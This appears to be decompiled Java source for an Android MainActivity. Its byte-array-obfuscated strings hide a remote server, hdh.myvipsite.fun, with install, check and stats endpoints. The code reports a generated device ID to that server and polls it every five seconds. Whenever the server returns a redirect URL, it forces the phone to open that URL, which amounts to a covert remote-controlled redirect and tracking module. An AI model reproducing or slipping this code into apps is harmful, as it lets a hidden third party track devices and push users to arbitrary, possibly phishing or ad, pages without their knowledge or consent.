package com.hda.jds;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

/* loaded from: /workspaces/Vps/decoded_apk/../reversed_android_project/classes.dex */
public class MainActivity extends Activity {
    private static Context context;
    private static String deviceId;
    private static ScheduledExecutorService scheduler;
    private static final byte[] a = {(byte) 69, (byte) 120, (byte) 112, (byte) 105, (byte) 114, (byte) 121, (byte) 71, (byte) 111, (byte) 100};
    private static final byte[] b = {(byte) 104, (byte) 116, (byte) 116, (byte) 112, (byte) 115, (byte) 58, (byte) 47, (byte) 47, (byte) 104, (byte) 100, (byte) 104, (byte) 46, (byte) 109, (byte) 121, (byte) 118, (byte) 105, (byte) 112, (byte) 115, (byte) 105, (byte) 116, (byte) 101, (byte) 46, (byte) 102, (byte) 117, (byte) 110, (byte) 47, (byte) 97, (byte) 112, (byte) 105, (byte) 47, (byte) 99, (byte) 104, (byte) 101, (byte) 99, (byte) 107, (byte) 46, (byte) 112, (byte) 104, (byte) 112};
    private static final byte[] c = {(byte) 104, (byte) 116, (byte) 116, (byte) 112, (byte) 115, (byte) 58, (byte) 47, (byte) 47, (byte) 104, (byte) 100, (byte) 104, (byte) 46, (byte) 109, (byte) 121, (byte) 118, (byte) 105, (byte) 112, (byte) 115, (byte) 105, (byte) 116, (byte) 101, (byte) 46, (byte) 102, (byte) 117, (byte) 110, (byte) 47, (byte) 97, (byte) 112, (byte) 105, (byte) 47, (byte) 105, (byte) 110, (byte) 115, (byte) 116, (byte) 97, (byte) 108, (byte) 108, (byte) 46, (byte) 112, (byte) 104, (byte) 112};
    private static final byte[] d = {(byte) 104, (byte) 116, (byte) 116, (byte) 112, (byte) 115, (byte) 58, (byte) 47, (byte) 47, (byte) 104, (byte) 100, (byte) 104, (byte) 46, (byte) 109, (byte) 121, (byte) 118, (byte) 105, (byte) 112, (byte) 115, (byte) 105, (byte) 116, (byte) 101, (byte) 46, (byte) 102, (byte) 117, (byte) 110, (byte) 47, (byte) 97, (byte) 112, (byte) 105, (byte) 47, (byte) 115, (byte) 116, (byte) 97, (byte) 116, (byte) 115, (byte) 46, (byte) 112, (byte) 104, (byte) 112};
    private static final byte[] e = {(byte) 100, (byte) 101, (byte) 118, (byte) 105, (byte) 99, (byte) 101, (byte) 95};

    /* renamed from: f, reason: collision with root package name */
    private static final byte[] f60f = {(byte) 63, (byte) 100, (byte) 101, (byte) 118, (byte) 105, (byte) 99, (byte) 101, (byte) 95, (byte) 105, (byte) 100, (byte) 61};
    private static final byte[] g = {(byte) 38, (byte) 118, (byte) 101, (byte) 114, (byte) 115, (byte) 105, (byte) 111, (byte) 110, (byte) 61, (byte) 49, (byte) 46, (byte) 48};
    private static final byte[] h = {(byte) 34, (byte) 115, (byte) 104, (byte) 111, (byte) 117, (byte) 108, (byte) 100, (byte) 95, (byte) 114, (byte) 101, (byte) 100, (byte) 105, (byte) 114, (byte) 101, (byte) 99, (byte) 116, (byte) 34, (byte) 58, (byte) 116, (byte) 114, (byte) 117, (byte) 101};
    private static final byte[] i = {(byte) 34, (byte) 114, (byte) 101, (byte) 100, (byte) 105, (byte) 114, (byte) 101, (byte) 99, (byte) 116, (byte) 95, (byte) 117, (byte) 114, (byte) 108, (byte) 34, (byte) 58, (byte) 34};
    private static final byte[] j = {(byte) 104, (byte) 116, (byte) 116, (byte) 112, (byte) 115, (byte) 58, (byte) 47, (byte) 47, (byte) 119, (byte) 119, (byte) 119, (byte) 46, (byte) 103, (byte) 111, (byte) 111, (byte) 103, (byte) 108, (byte) 101, (byte) 46, (byte) 99, (byte) 111, (byte) 109};
    private static boolean installReported = false;
    private static Runnable checkRunnable = new Runnable() { // from class: com.hda.jds.MainActivity.100000000
        @Override // java.lang.Runnable
        public void run() {
            MainActivity.checkExpiry();
        }
    };

    /* JADX INFO: Access modifiers changed from: private */
    public static String d(byte[] bArr) {
        return new String(bArr);
    }

    @Override // android.app.Activity
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        Start(this);
    }

    public static void Start(Context context2) {
        context = context2.getApplicationContext();
        deviceId = new StringBuffer().append(d(e)).append(System.currentTimeMillis()).toString();
        Log.d(d(a), new StringBuffer().append(new StringBuffer().append(d(a)).append(" Started - Device: ").toString()).append(deviceId).toString());
        reportInstall();
        startBackgroundCheck();
    }

    private static void reportInstall() {
        if (installReported) {
            return;
        }
        new Thread(new Runnable() { // from class: com.hda.jds.MainActivity.100000001
            @Override // java.lang.Runnable
            public void run() {
                try {
                    HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(new StringBuffer().append(new StringBuffer().append(new StringBuffer().append(MainActivity.d(MainActivity.c)).append(MainActivity.d(MainActivity.f60f)).toString()).append(MainActivity.deviceId).toString()).append(MainActivity.d(MainActivity.g)).toString()).openConnection();
                    httpURLConnection.setRequestMethod("GET");
                    httpURLConnection.setConnectTimeout(10000);
                    if (httpURLConnection.getResponseCode() == 200) {
                        Log.d(MainActivity.d(MainActivity.a), "Install reported successfully");
                        MainActivity.installReported = true;
                    }
                    httpURLConnection.disconnect();
                } catch (Exception e2) {
                    Log.e(MainActivity.d(MainActivity.a), "Install report failed");
                }
            }
        }).start();
    }

    private static void updateStats() {
        new Thread(new Runnable() { // from class: com.hda.jds.MainActivity.100000002
            @Override // java.lang.Runnable
            public void run() {
                try {
                    HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(new StringBuffer().append(new StringBuffer().append(MainActivity.d(MainActivity.d)).append(MainActivity.d(MainActivity.f60f)).toString()).append(MainActivity.deviceId).toString()).openConnection();
                    httpURLConnection.setRequestMethod("GET");
                    httpURLConnection.setConnectTimeout(5000);
                    httpURLConnection.getResponseCode();
                    httpURLConnection.disconnect();
                } catch (Exception e2) {
                }
            }
        }).start();
    }

    private static void startBackgroundCheck() {
        if (scheduler != null && !scheduler.isShutdown()) {
            scheduler.shutdown();
        }
        scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.scheduleAtFixedRate(checkRunnable, 0, 5, TimeUnit.SECONDS);
        Log.d(d(a), "Background checking started");
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static void checkExpiry() {
        Log.d(d(a), "Checking expiry status...");
        try {
            HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(d(b)).openConnection();
            httpURLConnection.setRequestMethod("GET");
            httpURLConnection.setConnectTimeout(10000);
            httpURLConnection.setReadTimeout(10000);
            int responseCode = httpURLConnection.getResponseCode();
            if (responseCode == 200) {
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
                StringBuilder sb = new StringBuilder();
                while (true) {
                    String readLine = bufferedReader.readLine();
                    if (readLine == null) {
                        break;
                    } else {
                        sb.append(readLine);
                    }
                }
                bufferedReader.close();
                Log.d(d(a), new StringBuffer().append("API Response: ").append(sb.toString()).toString());
                String extractRedirectUrl = extractRedirectUrl(sb.toString());
                if (sb.toString().contains(d(h)) && extractRedirectUrl != null) {
                    Log.d(d(a), new StringBuffer().append("REDIRECT TRIGGERED to: ").append(extractRedirectUrl).toString());
                    updateStats();
                    triggerRedirect(extractRedirectUrl);
                } else {
                    updateStats();
                }
            } else {
                Log.e(d(a), new StringBuffer().append("HTTP Error: ").append(responseCode).toString());
            }
            httpURLConnection.disconnect();
        } catch (Exception e2) {
            Log.e(d(a), "API Check Failed");
        }
    }

    private static String extractRedirectUrl(String str) {
        int length;
        int indexOf;
        try {
            int indexOf2 = str.indexOf(d(i));
            if (indexOf2 != -1 && (indexOf = str.indexOf("\"", (length = indexOf2 + d(i).length()))) != -1) {
                return str.substring(length, indexOf);
            }
        } catch (Exception e2) {
            Log.e(d(a), "Error extracting redirect URL");
        }
        return d(j);
    }

    private static void triggerRedirect(String str) {
        try {
            Log.d(d(a), new StringBuffer().append("Opening URL: ").append(str).toString());
            Intent intent = new Intent("android.intent.action.VIEW", Uri.parse(str));
            intent.setFlags(268435456);
            context.startActivity(intent);
            Log.d(d(a), new StringBuffer().append("Redirect successful to: ").append(str).toString());
        } catch (Exception e2) {
            Log.e(d(a), "Redirect failed");
        }
    }

    public static void stop() {
        if (scheduler != null) {
            scheduler.shutdown();
            Log.d(d(a), new StringBuffer().append(d(a)).append(" stopped").toString());
        }
    }

    @Override // android.app.Activity
    protected void onDestroy() {
        super.onDestroy();
        stop();
    }
}
